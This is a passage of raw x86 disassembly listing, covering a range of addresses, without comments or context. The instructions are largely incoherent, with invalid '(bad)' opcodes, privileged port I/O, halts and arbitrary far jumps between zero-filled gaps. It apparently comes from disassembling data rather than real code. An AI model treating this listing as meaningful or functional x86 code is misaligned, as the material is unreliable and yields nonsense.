  415b0a:	jmp    FWORD PTR [edi+eax*2+0x15058c45]
	...
  415b71:	add    BYTE PTR [eax],al
  415b73:	add    bh,bl
  415b75:	mov    esi,0xbb659205
  415b7a:	(bad)  
  415b7c:	stc    
  415b7d:	dec    ebp
  415b7e:	push   ss
  415b7f:	fadd   QWORD PTR [eax]
  415b81:	out    0xbd,eax
  415b83:	fdivr  DWORD PTR [ebx]
  415b85:	in     eax,0x0
  415b87:	add    BYTE PTR ds:0xa6000001,al
  415b8d:	out    0xe8,al
  415b8f:	repz mov eax,0xa9cbf959
  415b95:	mov    ds:0x7bb75ec1,eax
  415b9a:	loop   0x415be6
  415b9c:	jo     0x415c00
  415b9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b9f:	sub    eax,0x36e6788
  415ba4:	xchg   esi,eax
  415ba5:	fdiv   DWORD PTR [ebx]
  415ba7:	lods   al,BYTE PTR ds:[esi]
  415ba8:	mov    WORD PTR [ebp-0x2e],gs
  415bab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415bac:	inc    ebx
  415bad:	sbb    eax,0x9bb1a668
  415bb2:	das    
  415bb3:	sbb    ebx,0xf250726b
  415bb9:	fiadd  DWORD PTR [ebx-0xb]
  415bbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415bbd:	jmp    0x415c26
  415bbf:	pop    edi
  415bc0:	adc    BYTE PTR [eax-0xdb3b621],al
  415bc6:	mov    esp,ebp
  415bc8:	or     BYTE PTR [ebp-0x4548f82c],0x29
  415bcf:	push   esp
  415bd0:	fwait
  415bd1:	sbb    eax,0x2e0ce48e
  415bd6:	dec    esp
  415bd7:	shl    DWORD PTR [edi],1
  415bd9:	mov    ds,WORD PTR [ebp+0x3c]
  415bdc:	or     bl,BYTE PTR [edx+0x1d82ff64]
  415be2:	mov    dh,0xc9
  415be4:	xor    eax,0x659ff532
  415be9:	aad    0xe3
  415beb:	push   0xffffffbc
  415bed:	push   edx
  415bee:	jbe    0x415c0b
  415bf0:	retf   
  415bf1:	fisub  WORD PTR [ecx+ebx*8]
  415bf4:	jmp    0x415b7b
  415bf6:	jmp    0x5651e299
  415bfb:	jmp    0xebe8:0x669977a9
  415c02:	jge    0x415c11
  415c04:	hlt    
  415c05:	jecxz  0x415c4a
  415c07:	out    dx,al
  415c08:	dec    eax
  415c09:	cmp    DWORD PTR [edx+0x45d4df1a],ebp
  415c0f:	sbb    eax,0xd943b067
  415c14:	mov    dl,BYTE PTR ss:[ebx-0x43adc09e]
  415c1b:	mov    WORD PTR [ebx-0x7ac55900],gs
  415c21:	(bad)
  415c24:	imul   ebp,DWORD PTR [ecx+0x5b48d264],0x2
  415c2b:	outs   dx,DWORD PTR ds:[esi]
  415c2c:	repnz in al,0x5d
  415c2f:	ins    BYTE PTR es:[edi],dx
  415c30:	mov    ah,0xa1
  415c32:	pop    ds
  415c33:	mov    ebx,DWORD PTR ds:[edi]
  415c36:	stos   DWORD PTR es:[edi],eax
  415c37:	rol    ah,0x3
  415c3a:	lods   al,BYTE PTR ds:[esi]
  415c3b:	inc    esi
  415c3c:	test   esp,ecx
  415c3e:	(bad)  
  415c3f:	cmp    al,0xdc
  415c41:	pop    ds
  415c42:	retf   
  415c43:	not    esp
  415c45:	jnp    0x415c34
  415c47:	push   ebp
  415c48:	sbb    BYTE PTR [ebx],0x25
  415c4b:	xchg   BYTE PTR [edx+0x2a0b7188],ch
  415c51:	mov    ds:0x35349068,al
  415c56:	in     eax,0x4e
  415c58:	xchg   edi,eax
  415c59:	dec    ebp
  415c5a:	and    al,0x84
  415c5c:	dec    ecx
  415c5d:	xor    ch,dh
  415c5f:	sbb    cl,BYTE PTR [ebx-0x46aafb11]
  415c65:	call   0x92e7:0x2f7cb8b3
  415c6c:	push   edi
  415c6d:	sub    BYTE PTR [ecx-0x71],dl
  415c70:	call   0x85f85cd5
  415c75:	adc    BYTE PTR [ebp-0x7cc81cd7],dh
  415c7b:	jbe    0x415c91
  415c7d:	mov    al,ds:0x9663d39b
  415c82:	imul   ebx,ecx,0x60
  415c85:	push   0x65
  415c87:	mov    ebx,edx
  415c89:	lods   eax,DWORD PTR ds:[esi]
  415c8a:	mov    eax,ds:0xb41e735d
  415c8f:	cmp    eax,DWORD PTR [bx+si]
	...
  415cf2:	add    BYTE PTR [eax],al
  415cf4:	cmp    dl,BYTE PTR [eax]
  415cf6:	mov    edi,0xbbbfbf3c
  415cfb:	push   ss
  415cfc:	push   esp
  415cfd:	push   ecx
  415cfe:	mov    esi,0xfe8a301f
  415d03:	mov    ds:0xe640,al
  415d08:	add    eax,0xe1000001
  415d0d:	std    
  415d0e:	or     al,0x2a
  415d10:	and    BYTE PTR [edi+0x38c698e2],al
  415d16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d17:	cdq    
  415d18:	mov    DWORD PTR [esi-0x50909b28],ebp
  415d1e:	or     al,0xb9
  415d20:	sbb    eax,DWORD PTR ds:0xa501b00f
  415d26:	shr    BYTE PTR [ecx],cl
  415d28:	fmul   DWORD PTR [ecx-0x65]
  415d2b:	adc    DWORD PTR [eax-0x24],eax
  415d2e:	in     al,dx
  415d2f:	xor    eax,DWORD PTR [edx-0xe]
  415d32:	mov    edx,0xb182d181
  415d37:	and    eax,0xebdf09e3
  415d3c:	jmp    0x415d11
  415d3e:	xchg   ebp,eax
  415d3f:	inc    edi
  415d40:	or     DWORD PTR [ebx+0x4d],ebp
  415d43:	xchg   edi,eax
  415d44:	jecxz  0x415d2a
  415d46:	jmp    0x415d4a
  415d48:	out    0x84,eax
  415d4a:	stc    
  415d4b:	mov    WORD PTR [ecx+0x41],cs
  415d4e:	pop    esi
  415d4f:	aam    0x16
  415d51:	shl    DWORD PTR [eax+edx*4-0x32a8a080],0x93
  415d59:	repz inc edi
  415d5b:	dec    esi
  415d5c:	cli    
  415d5d:	call   0x7ead:0xa89e3b46
  415d64:	rcl    bl,cl
  415d66:	mov    al,ds:0x42902f1d
  415d6b:	xchg   ebp,eax
  415d6c:	sub    DWORD PTR gs:[ebx+0x6955eae9],ecx
  415d73:	ja     0x415db1
  415d75:	xor    DWORD PTR [eax-0x1a455897],ebx
  415d7b:	loope  0x415dbe
  415d7d:	test   al,0x2b
  415d7f:	pop    ss
  415d80:	mov    ebp,0xfe301f28
  415d85:	int3   
  415d86:	and    ah,bh
  415d88:	js     0x415de3
  415d8a:	sub    BYTE PTR [edx],ah
  415d8c:	sub    cl,0x9b
  415d8f:	and    eax,0xf66da3bf
  415d94:	xchg   esp,eax
  415d95:	cmp    al,0x95
  415d97:	push   esp
  415d98:	xor    ebx,DWORD PTR [ebp+0x4b]
  415d9b:	and    cl,BYTE PTR [eax]
  415d9d:	inc    ebx
  415d9e:	or     bh,ah
  415da0:	cmc    
  415da1:	cmp    DWORD PTR [edx-0x69],0x3
  415da5:	icebp  
  415da6:	ret    
  415da7:	push   ds
  415da8:	mov    ds:0xfdc17e2,al
  415dad:	adc    ebx,DWORD PTR [eax+edi*8-0x7e288986]
  415db4:	xchg   BYTE PTR [ebp+ebp*8+0x2fb1d464],cl
  415dbb:	adc    DWORD PTR [esi],0x9676136b
  415dc1:	imul   BYTE PTR [edi+0x40f20b6f]
  415dc7:	inc    esp
  415dc8:	adc    DWORD PTR [edx+0x4c5cdc7c],edx
  415dce:	repnz sub ecx,esi
  415dd1:	mov    edx,0x32479318
  415dd6:	xor    DWORD PTR [edi-0x2e],esi
  415dd9:	retf   0x5900
  415ddc:	popa   
  415ddd:	adc    bh,BYTE PTR [eax+ebx*2-0x43]
  415de1:	xchg   esp,eax
  415de2:	or     esp,esi
  415de4:	or     esp,esp
  415de6:	sbb    DWORD PTR [ecx+0x6e492352],ecx
  415dec:	dec    esi
  415ded:	fs jp  0x415da2
  415df0:	repnz add cl,BYTE PTR [edx]
  415df3:	in     al,dx
  415df4:	adc    DWORD PTR [edi+0x13438259],ebp
  415dfa:	cmp    BYTE PTR [edx-0x10],bl
  415dfd:	dec    eax
  415dfe:	repnz or ch,BYTE PTR [ecx]
  415e01:	or     BYTE PTR [ecx],dl
  415e03:	repnz push edx
  415e05:	push   ebx
  415e06:	je     0x415e4b
  415e08:	stos   BYTE PTR es:[edi],al
  415e09:	ins    DWORD PTR es:[edi],dx
  415e0a:	add    BYTE PTR [eax+0x10d2f46f],ah
  415e10:	mov    DWORD PTR [eax],0x0
	...
  415e72:	add    BYTE PTR [eax],al
  415e74:	out    dx,al
  415e75:	repnz cmc 
  415e77:	add    edi,ebp
  415e79:	pop    es
  415e7a:	(bad)  
  415e7b:	call   FWORD PTR [ebp+0x1f]
  415e7e:	les    esi,FWORD PTR [eax+0x14]
  415e81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e82:	arpl   ax,ax
  415e84:	inc    ebp
  415e85:	out    0x0,eax
  415e87:	add    BYTE PTR ds:0xae000001,al
  415e8d:	xchg   edx,eax
  415e8e:	popa   
  415e8f:	push   0xffffffa2
  415e91:	xchg   BYTE PTR [edi],dh
  415e93:	jl     0x415eac
  415e95:	imul   ebp,DWORD PTR [edi-0x76],0xffffffd7
  415e99:	repz je 0x415ed3
  415e9c:	repz out 0x79,eax
  415e9f:	ins    DWORD PTR es:[edi],dx
  415ea0:	xor    BYTE PTR gs:[ebx],cl
  415ea3:	cld    
  415ea4:	fbld   TBYTE PTR [ebp+0x2daec255]
  415eaa:	retf   
  415eab:	in     eax,0xe8
  415ead:	push   ds
  415eae:	pop    ecx
  415eaf:	cmp    DWORD PTR [esi],esi
  415eb1:	pushf  
  415eb2:	cs cdq 
  415eb4:	lods   eax,DWORD PTR ds:[esi]
  415eb5:	dec    edi
  415eb6:	iret   
  415eb7:	out    0xa8,eax
  415eb9:	inc    DWORD PTR [ebx]
  415ebb:	pop    ecx
  415ebc:	ins    DWORD PTR es:[edi],dx
  415ebd:	pop    ss
  415ebe:	retf   
  415ebf:	shrd   DWORD PTR [ebx+0x1],ebp,0xec
  415ec4:	sbb    ebp,DWORD PTR [ebx+0x18]
  415ec7:	push   es
  415ec8:	(bad)  
  415ec9:	in     al,0xb6
  415ecb:	ss add esi,edi
  415ece:	xchg   esi,eax
  415ecf:	xchg   edx,eax
  415ed0:	retf   0x74bb
  415ed3:	sub    al,0x5c
  415ed5:	push   ebp
  415ed6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ed7:	sahf   
  415ed8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ed9:	mov    esp,0xd1ff5017
  415ede:	push   cs
  415edf:	adc    dh,bh
  415ee1:	xchg   BYTE PTR [ecx+0x7f],ch
  415ee4:	or     DWORD PTR [esi-0x37],ebp
  415ee7:	mov    edi,0x1619d9ad
  415eec:	cmp    DWORD PTR [edi+0x15],ecx
  415eef:	add    al,0xf2
  415ef1:	or     al,BYTE PTR [ebx+0x66197bef]
  415ef7:	ret    0x7eb5
  415efa:	pop    edx
  415efb:	(bad)  
  415efc:	jl     0x415f04
  415efe:	das    
  415eff:	nop
  415f00:	jl     0x415ebe
  415f02:	lock jle 0x415f2c
  415f05:	add    al,0xf1
  415f07:	and    eax,0x8d2545c4
  415f0c:	push   ebx
  415f0d:	(bad)  
  415f0e:	addr16 xchg esi,eax
  415f10:	pushf  
  415f11:	or     esp,eax
  415f13:	call   0x7326:0x1bd8c9f7
  415f1a:	data16 (bad) 
  415f1e:	dec    ebp
  415f1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f20:	and    al,0x88
  415f22:	mov    ch,0x50
  415f24:	mov    eax,0xedb4876c
  415f29:	int3   
  415f2a:	mov    esi,0xaafcc5db
  415f2f:	enter  0x6ec8,0x2b
  415f33:	loop   0x415f99
  415f35:	(bad)  
  415f36:	and    al,0x74
  415f38:	ss out 0xa8,al
  415f3b:	xchg   BYTE PTR [edx],dl
  415f3d:	and    eax,0x4651609d
  415f42:	stos   DWORD PTR es:[edi],eax
  415f43:	mov    ah,0xa1
  415f45:	push   edx
  415f46:	mov    cl,cl
  415f48:	adc    BYTE PTR [esi-0x4b573635],dl
  415f4e:	sbb    esi,DWORD PTR [esi-0x1d]
  415f51:	sbb    DWORD PTR [eax-0x5410d646],edi
  415f57:	jge    0x415fb4
  415f59:	sbb    DWORD PTR cs:[ebx],ecx
  415f5c:	mov    dh,0xf2
  415f5e:	paddsb mm4,QWORD PTR [ebp+0xa]
  415f62:	and    ch,ch
  415f64:	dec    esp
  415f65:	iret   
  415f66:	cmp    edi,ecx
  415f68:	cwde   
  415f69:	add    ebp,DWORD PTR [ebx]
  415f6b:	ins    DWORD PTR es:[edi],dx
  415f6c:	sub    BYTE PTR [ecx+0x73],dh
  415f6f:	adc    esi,DWORD PTR [edx+0x7d]
  415f72:	push   eax
  415f73:	leave  
  415f74:	xchg   BYTE PTR [eax-0x35],dl
  415f77:	dec    eax
  415f79:	inc    ecx
  415f7a:	test   dh,cl
  415f7c:	jl     0x415f30
  415f7e:	jl     0x415f15
  415f80:	or     edx,DWORD PTR [esi-0xbc56b41]
  415f86:	(bad)  
  415f87:	jmp    0x415ff9
  415f89:	push   0x5fc6b2b4
  415f8e:	dec    edx
  415f8f:	sbb    ch,0x0
	...
  415ff2:	add    BYTE PTR [eax],al
  415ff4:	pop    ss
  415ff5:	mov    BYTE PTR [esi-0x6e],ch
  415ff8:	push   esi
  415ffa:	dec    DWORD PTR [ebp-0x37ca37e8]
  416000:	fcom   QWORD PTR ss:[eax]
  416003:	jnp    0x41604f
  416005:	call   0x146600a
  41600a:	add    BYTE PTR [eax],al
  41600c:	dec    DWORD PTR [ebp-0x1993b8c6]
  416012:	push   ebp
  416013:	or     eax,0x81d85d93
  416018:	loop   0x415faa
  41601a:	push   es
  41601b:	pop    edx
  41601c:	mov    bl,0x29
  41601e:	pop    DWORD PTR [edi+0x19d1562f]
  416024:	ret    0x6a24
  416027:	mov    dl,0x48
  416029:	dec    esp
  41602a:	sub    DWORD PTR [edx],eax
  41602c:	dec    esi
  41602d:	inc    ebp
  41602e:	sub    bh,BYTE PTR [ecx-0x85a6036]
  416034:	ror    BYTE PTR [esi+ebx*1],1
  416037:	in     eax,dx
  416038:	add    edi,DWORD PTR [esi]
  41603a:	or     DWORD PTR [esi+eiz*8+0x2c],ebx
  41603e:	xchg   esp,eax
  41603f:	test   DWORD PTR gs:[edi+0x436f8220],0x7028aa04
  41604a:	jo     0x4160b6
  41604c:	fbstp  TBYTE PTR [edx]
  41604e:	(bad)  
  41604f:	xchg   esi,eax
  416050:	xchg   dh,cl
  416052:	inc    edi
  416053:	push   0xb2e541e4
  416058:	imul   edi,edi,0x62a29750
  41605e:	les    ecx,FWORD PTR [esi]
  416060:	push   ecx
  416061:	mov    DWORD PTR [esi],ebx
  416063:	jne    0x41608a
  416065:	sbb    al,0x11
  416067:	inc    esp
  416068:	aas    
  416069:	shl    DWORD PTR [edi*2+0x561359bc],cl
  416070:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416071:	push   edx
  416072:	cwde   
  416073:	pop    ecx
  416074:	repz imul ecx,DWORD PTR [ebp+0x5f],0xe4a5e44f
  41607c:	outs   dx,BYTE PTR ds:[esi]
  41607d:	ss (bad) 
  41607f:	scas   eax,DWORD PTR es:[edi]
  416080:	js     0x416088
  416082:	out    0xae,al
  416084:	pushf  
  416085:	add    ch,al
  416087:	jmp    0xeb352b62
  41608c:	leave  
  41608d:	je     0x416043
  41608f:	mov    WORD PTR [ebp+edi*2-0x40],ds
  416093:	int3   
  416094:	fbstp  TBYTE PTR ss:[ebx-0x3e859330]
  41609b:	les    edx,FWORD PTR [edi]
  41609d:	fwait
  41609e:	shr    BYTE PTR [ecx],0xb7
  4160a1:	adc    edx,DWORD PTR [ecx-0x63c348ff]
  4160a7:	rol    BYTE PTR [ecx-0x95018a6],0x55
  4160ae:	iret   
  4160af:	mov    ds:0x66835180,eax
  4160b4:	imul   ecx,esi,0x35
  4160b7:	pop    esi
  4160b8:	loopne 0x4160ea
  4160ba:	adc    al,0x84
  4160bc:	or     DWORD PTR [edi],ebp
  4160be:	adc    edi,DWORD PTR [eax+0x3e]
  4160c1:	jae    0x4160a0
  4160c3:	mov    edi,DWORD PTR [ebx-0x7ac90e27]
  4160c9:	push   esi
  4160ca:	cmp    dl,dh
  4160cc:	and    dh,BYTE PTR [ecx-0x6a]
  4160cf:	push   edi
  4160d0:	mov    ah,0x64
  4160d2:	test   BYTE PTR [eax+ecx*2-0x44],dl
  4160d6:	(bad)  
  4160d7:	xchg   esp,eax
  4160d8:	mov    dl,0xb4
  4160da:	fprem1 
  4160dc:	sub    edi,ecx
  4160de:	inc    ebx
  4160df:	mov    al,0x20
  4160e1:	pop    ecx
  4160e2:	test   DWORD PTR [eax-0x70],esi
  4160e5:	mov    ds:0xf6c10ef4,al
  4160ea:	mov    edx,0x9d5578b2
  4160ef:	or     eax,0xfb7e5f9c
  4160f4:	enter  0x3575,0xb2
  4160f8:	and    DWORD PTR [edx],ebx
  4160fa:	ret    0x7ef
  4160fd:	push   ss
  4160fe:	xchg   esp,eax
  4160ff:	imul   eax,DWORD PTR [ebp+0x6d],0xf12f2378
  416106:	leave  
  416107:	xchg   edx,eax
  416108:	lds    esi,FWORD PTR [esi]
  41610a:	rcr    DWORD PTR [ebp-0x1186a04d],cl
  416110:	add    BYTE PTR es:[eax],al
	...
  416173:	add    BYTE PTR [eax],ah
  416175:	jmp    0xdf3d3fb5
  41617a:	in     eax,0xff
  41617c:	(bad)  
  41617d:	push   edx
  41617e:	sub    eax,0xeaab8af3
  416183:	mov    ebp,0xe94f
  416188:	add    eax,0x1000001
  41618d:	cmp    eax,0xb290f256
  416192:	cmp    dh,BYTE PTR [edi+0x42]
  416195:	mov    bh,0x5a
  416197:	jg     0x416205
  416199:	ins    DWORD PTR es:[edi],dx
  41619a:	sbb    ch,0x69
  41619d:	jae    0x41620c
  41619f:	ret    
  4161a0:	sbb    DWORD PTR [edx-0x3e],0x5d
  4161a4:	iret   
  4161a5:	ja     0x41620a
  4161a7:	cmp    ch,BYTE PTR [edi]
  4161a9:	sbb    BYTE PTR [eax],cl
  4161ab:	fcom   QWORD PTR [edi]
  4161ad:	ret    
  4161ae:	sbb    BYTE PTR [ebp-0x62ab5c35],al
  4161b4:	jns    0x41618a
  4161b6:	inc    eax
  4161b7:	rcl    BYTE PTR [ecx+0x486a7146],1
  4161bd:	mov    dl,0x43
  4161bf:	mov    esi,0x9d12278a
  4161c4:	xchg   DWORD PTR [ebx+edx*1+0x353060ed],ebx
  4161cb:	out    0xf,al
  4161cd:	cmp    esi,DWORD PTR [ebp-0x1ae52d23]
  4161d3:	lock imul esi,DWORD PTR ds:0x78e3ef89,0x60e39720
  4161de:	loope  0x4161e9
  4161e0:	and    al,0x8e
  4161e2:	or     eax,0x6254c471
  4161e7:	or     ebx,DWORD PTR [ecx-0x46f19c4e]
  4161ed:	pop    ebx
  4161ee:	retf   0x13bd
  4161f1:	push   cs
  4161f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4161f3:	pop    ss
  4161f4:	xchg   ebp,eax
  4161f5:	inc    edi
  4161f6:	ins    DWORD PTR es:[edi],dx
  4161f7:	out    0xbf,al
  4161f9:	cmp    DWORD PTR [esp+edx*1],esi
  4161fc:	mov    ebx,0xa4731ad8
  416201:	rcl    BYTE PTR [ebp+0x67],cl
  416204:	ds out 0x9c,eax
  416207:	out    0xd6,al
  416209:	cmp    al,0x6e
  41620b:	mov    BYTE PTR [edx-0x6cac9636],bl
  416211:	adc    eax,0xc2ade456
  416216:	mov    bh,BYTE PTR ds:0xdf40dd69
  41621c:	fstp   DWORD PTR [edi]
  41621e:	out    0xca,eax
  416220:	and    eax,0x51535a70
  416225:	aas    
  416226:	and    edx,DWORD PTR [ecx+eax*4+0xd7d90ee]
  41622d:	inc    ecx
  41622e:	fdiv   DWORD PTR [eax-0x8]
  416231:	stos   DWORD PTR es:[edi],eax
  416232:	inc    esp
  416233:	adc    esp,DWORD PTR [eax-0x5e]
  416236:	in     al,0x24
  416238:	pop    eax
  416239:	arpl   WORD PTR [ebx],bp
  41623b:	sub    DWORD PTR [ebp+esi*4+0x16],0x7e
  416240:	retf   0x67de
  416243:	adc    al,BYTE PTR [ecx-0xd]
  416246:	mov    cl,0x90
  416248:	push   ebx
  416249:	fst    DWORD PTR [edx+0xc]
  41624c:	(bad)  
  41624d:	stos   BYTE PTR es:[edi],al
  41624e:	loope  0x416232
  416250:	jnp    0x416246
  416252:	ret    
  416253:	push   ebx
  416254:	loop   0x4162a0
  416256:	cld    
  416257:	inc    ebx
  416258:	rol    DWORD PTR [ecx],1
  41625a:	inc    edx
  41625b:	or     ecx,DWORD PTR [ebx-0x7979571]
  416261:	arpl   WORD PTR [edx-0x2e239558],sp
  416267:	inc    esi
  416268:	inc    ebx
  416269:	(bad)  
  41626a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41626b:	fs sar BYTE PTR ss:[esp+eax*8],1
  416270:	pop    ds
  416271:	cwde   
  416272:	xchg   ecx,eax
  416273:	enter  0xfdf,0x44
  416277:	push   ebx
  416278:	jo     0x416270
  41627a:	pusha  
  41627b:	mov    dl,0x84
  41627d:	or     bh,BYTE PTR [eax]
  41627f:	aaa    
  416280:	mov    bl,0xb7
  416282:	ins    BYTE PTR es:[edi],dx
  416283:	push   edi
  416284:	mov    cl,BYTE PTR [edx-0x142bfd8a]
  41628a:	fidiv  DWORD PTR [edx]
  41628c:	dec    edi
  41628d:	repnz pop ds
  41628f:	mov    al,ds:0xa5
	...
  4162f4:	and    ebp,DWORD PTR [esi+0x32]
  4162f7:	and    eax,0x6e377d7f
  4162fc:	mov    bl,0x5f
  4162fe:	call   0x547f:0xc3178cee
  416305:	jmp    0x0:0x1050000
  41630c:	ins    DWORD PTR es:[edi],dx
  41630d:	inc    edi
  41630e:	pop    ebp
  41630f:	in     eax,0xc4
  416311:	rcl    bh,0xf6
  416314:	push   edi
  416315:	xlat   BYTE PTR ds:[ebx]
  416316:	adc    eax,0x9c7b1788
  41631b:	jecxz  0x41632e
  41631d:	cmp    DWORD PTR [ebp-0x1ff59244],0x553bf773
  416327:	out    dx,eax
  416328:	test   WORD PTR [ebp+0x4f],bp
  41632c:	jge    0x416366
  41632e:	push   es
  41632f:	int    0x29
  416331:	mov    dl,0xc6
  416333:	iret   
  416334:	mov    ecx,0x7bf55b63
  416339:	jecxz  0x4163b8
  41633b:	icebp  
  41633c:	push   ss
  41633d:	std    
  41633e:	aad    0xbc
  416340:	je     0x416351
  416342:	jmp    0xd6f5:0xdc032f04
  416349:	jmp    0x416377
  41634b:	xchg   ebx,eax
  41634c:	adc    cl,dh
  41634e:	into   
  41634f:	push   esi
  416350:	xchg   esp,eax
  416351:	pop    ss
  416352:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416353:	mov    al,ds:0x6895543b
  416358:	fisubr WORD PTR [ebx-0x55]
  41635b:	ficomp WORD PTR ds:0x55c4ea73
  416361:	fs mov ah,0xe4
  416364:	mov    DWORD PTR [eax],0xbd82274b
  41636a:	bound  eax,QWORD PTR [edi+0x2eb3790c]
  416370:	xchg   esp,eax
  416371:	jnp    0x416343
  416373:	ins    DWORD PTR es:[edi],dx
  416374:	pop    ebp
  416375:	ficom  WORD PTR [eax+0x54]
  416378:	jnp    0x4163ce
  41637a:	mov    eax,0x7873b778
  41637f:	retf   
  416380:	into   
  416381:	jecxz  0x41635b
  416383:	or     al,0x13
  416385:	pop    esp
  416386:	jl     0x4163bb
  416388:	rol    ecx,1
  41638a:	(bad)  [ecx-0x788100ab]
  416390:	ja     0x4163dc
  416392:	xor    eax,0x1c875f08
  416397:	outs   dx,DWORD PTR ds:[esi]
  416398:	mov    edx,0xc85c308a
  41639d:	jecxz  0x416344
  41639f:	jb     0x4163f5
  4163a1:	(bad)
  4163a4:	mov    ss,WORD PTR [edi-0x68]
  4163a7:	test   eax,0x917bfda0
  4163ac:	inc    edi
  4163ad:	outs   dx,DWORD PTR ds:[esi]
  4163ae:	inc    edi
  4163af:	mov    ah,al
  4163b1:	push   eax
  4163b2:	cs stos DWORD PTR es:[edi],eax
  4163b4:	adc    eax,0xa82d7804
  4163b9:	adc    bl,BYTE PTR [eax+0x74]
  4163bc:	fisub  DWORD PTR [esi]
  4163be:	pusha  
  4163bf:	sub    edx,ecx
  4163c1:	inc    edi
  4163c2:	mov    al,0xc7
  4163c4:	int    0x9a
  4163c6:	addr16 or eax,0x8728ed78
  4163cc:	sub    esp,ebp
  4163ce:	push   es
  4163cf:	mov    ds:0x7f1a5164,eax
  4163d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4163d5:	add    ecx,ebp
  4163d7:	pop    eax
  4163d8:	adc    edx,DWORD PTR [eax+edi*8+0x74]
  4163dc:	ins    DWORD PTR es:[edi],dx
  4163dd:	xlat   BYTE PTR ds:[ebx]
  4163de:	repz mov ds:0xdd511c6b,al
  4163e4:	mov    eax,ds:0x31d7778e
  4163e9:	ss lock (bad) 
  4163ec:	adc    DWORD PTR [edx-0x5e],edx
  4163ef:	js     0x416461
  4163f1:	xor    DWORD PTR [esi+0x38],eax
  4163f4:	xor    eax,0xf9feb7d7
  4163f9:	xor    DWORD PTR fs:[ebx+0x75a922a0],ebp
  416400:	mov    edi,0xa55a3989
  416405:	inc    edx
  416406:	xchg   edi,eax
  416407:	cld    
  416408:	rol    bh,0x25
  41640b:	dec    edi
  41640c:	or     eax,0x9eed63c7
	...
  416471:	add    BYTE PTR [eax],al
  416473:	add    bl,dh
  416475:	inc    ebx
  416476:	ror    cl,1
  416478:	lock (bad) 
  41647b:	jnp    0x41640b
  41647d:	xor    al,0x5a
  41647f:	xchg   esi,eax
  416480:	jo     0x41642f
  416482:	rcr    ch,0x59
  416485:	jmp    0x416487
  416487:	add    BYTE PTR ds:0xcb000001,al
  41648d:	mov    eax,0x539e1cde
  416492:	and    BYTE PTR [edi+0x529286fa],0x9d
  416499:	js     0x41642e
  41649b:	outs   dx,BYTE PTR ds:[esi]
  41649c:	adc    eax,DWORD PTR [edx-0x68]
  41649f:	inc    eax
  4164a0:	mov    edi,0xe489657e
  4164a5:	xchg   edi,eax
  4164a6:	pushf  
  4164a7:	mov    ebx,0x3650673c
  4164ac:	dec    esp
  4164ad:	adc    al,0xbc
  4164af:	setae  dl
  4164b2:	jo     0x416495
  4164b4:	mov    edi,0x6add0d81
  4164b9:	ins    DWORD PTR es:[edi],dx
  4164ba:	sbb    edi,0xffffff84
  4164bd:	and    ecx,DWORD PTR [edx-0x18]
  4164c0:	xchg   edi,eax
  4164c1:	mov    al,0x3c
  4164c3:	push   cs
  4164c4:	push   eax
  4164c5:	adc    ebx,DWORD PTR [edx+0x45]
  4164c8:	nop
  4164c9:	test   edx,edi
  4164cb:	outs   dx,BYTE PTR ds:[esi]
  4164cc:	fdiv   QWORD PTR [edi-0x2e0e9443]
  4164d2:	add    DWORD PTR [ebx+0x79],ecx
  4164d5:	adc    edi,DWORD PTR [ebx-0x3c]
  4164d8:	push   ebp
  4164d9:	sbb    eax,0x4d6de302
  4164de:	inc    esp
  4164df:	mov    esi,0x44bceb82
  4164e4:	int3   
  4164e5:	and    eax,0xf87781d
  4164ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4164eb:	sar    BYTE PTR [edx-0x31],0xe1
  4164ef:	int    0x4a
  4164f1:	test   BYTE PTR [ebp+0x40b57c9e],0xbc
  4164f8:	dec    edi
  4164f9:	jp     0x4164a8
  4164fb:	and    ah,BYTE PTR [esi-0x2132dc14]
  416501:	mov    DWORD PTR [ecx],ebx
  416503:	out    0xd,al
  416505:	rcl    al,0x80
  416508:	test   DWORD PTR [edx+0x75dba21c],edx
  41650e:	inc    edi
  41650f:	cmp    esp,DWORD PTR [edi]
  416511:	push   esp
  416512:	mov    ch,0x37
  416514:	dec    eax
  416515:	scas   eax,DWORD PTR es:[edi]
  416516:	dec    eax
  416517:	xor    cl,BYTE PTR [ebp+edi*4-0x2e81de3d]
  41651e:	js     0x4164c2
  416520:	and    al,0xe4
  416522:	pop    edi
  416523:	popa   
  416524:	add    eax,0xbdff8d38
  416529:	mov    esp,0x6d71fd04
  41652e:	mov    eax,0x7caa6f3c
  416533:	add    bl,ch
  416535:	(bad)  
  416536:	mul    BYTE PTR [edx-0x7ffbe86e]
  41653c:	mov    dh,0x53
  41653e:	jp     0x4165ac
  416540:	aaa    
  416541:	dec    ecx
  416542:	in     eax,dx
  416543:	fidivr WORD PTR [edx+0x78]
  416546:	cmp    ah,dh
  416548:	mov    bl,bl
  41654a:	mov    edx,0x3f04b8fa
  41654f:	out    dx,eax
  416550:	sbb    eax,0xb69381b4
  416555:	pop    ss
  416556:	imul   edx,DWORD PTR [eax-0x482ff77e],0x55
  41655d:	xchg   esp,eax
  41655e:	inc    eax
  41655f:	adc    DWORD PTR [edx+0x33],edx
  416562:	std    
  416563:	pop    ebp
  416564:	adc    dh,BYTE PTR [edi+0x20]
  416567:	xchg   ecx,eax
  416568:	fcmove st,st(7)
  41656a:	mov    esi,0xe4943f1a
  41656f:	push   0x738c84a9
  416574:	cli    
  416575:	nop
  416576:	mov    esi,0x890c17b4
  41657b:	cmp    edx,DWORD PTR [edi]
  41657d:	lock es stos DWORD PTR es:[edi],eax
  416580:	pop    ecx
  416581:	loope  0x4165b2
  416583:	div    BYTE PTR [edi+ebp*1]
  416586:	popf   
  416587:	or     al,0x3e
  416589:	sub    BYTE PTR [ebp-0x4b],dh
  41658c:	add    eax,0x674f1cb2
	...
  4165f1:	add    BYTE PTR [eax],al
  4165f3:	add    BYTE PTR ds:0xfff32bd8,ah
